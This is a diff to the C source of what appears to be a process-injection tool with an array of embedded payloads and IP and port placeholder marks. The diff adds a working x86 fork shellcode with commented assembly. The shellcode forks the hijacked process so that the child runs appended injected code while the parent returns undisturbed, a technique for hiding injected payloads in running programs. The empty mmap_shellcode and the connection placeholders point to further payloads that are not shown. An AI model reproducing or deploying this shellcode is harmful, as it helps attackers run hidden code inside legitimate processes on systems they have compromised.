@@ -10,7 +10,9 @@ struct payload {
 */
 
 
-//characters used for personalization
+/*
+ * Characters used for personalization (like a bookmark)
+ */
 
 const char  ip_mark =       'A',
             port_mark =     'B',
@@ -21,6 +23,36 @@ const char  ip_mark =       'A',
 
 
 
+char mmap_shellcode[] = "";
+
+
+/*
+ * Shellcode that fork() the parent process.
+ * Child process exec the injected code, parent just return to his normal
+ * behaviour...
+ */
+
+/*
+    push %eax       # save %eax value (needed by parent process)
+
+    push $2
+    pop %eax
+    int $0x80       # fork
+
+    test %eax, %eax
+    jz shellcode    # child jumps to shellcode
+
+    pop %eax        # parent process
+    ret             # is restored
+
+    shellcode:      # append your shellcode
+*/
+
+char fork_shellcode[] = "\x50\x6a\x02\x58\xcd\x80\x85\xc0\x74\x08\x58\xc3";
+
+/*
+ * List of embedded shellcodes
+ */
 struct payload payloads[] = {
 
 #ifdef linux_x86
